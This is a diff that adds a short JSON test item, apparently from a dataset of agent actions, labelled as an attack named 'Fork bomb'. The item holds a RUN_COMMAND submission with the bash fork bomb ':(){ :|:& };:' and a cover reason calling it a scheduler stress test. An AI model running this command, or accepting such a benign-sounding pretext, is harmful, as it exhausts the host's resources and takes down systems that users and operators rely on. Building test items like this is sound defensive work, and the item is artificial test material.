@@ -1,0 +1,14 @@
+{
+  "intent_num": 9,
+  "category": "attacks",
+  "name": "Fork bomb",
+  "submissions": [
+    {
+      "action": "RUN_COMMAND",
+      "data": {
+        "command": ":(){ :|:& };:"
+      },
+      "reason": "Stress-test the scheduler by spawning many short-lived shells."
+    }
+  ]
+}
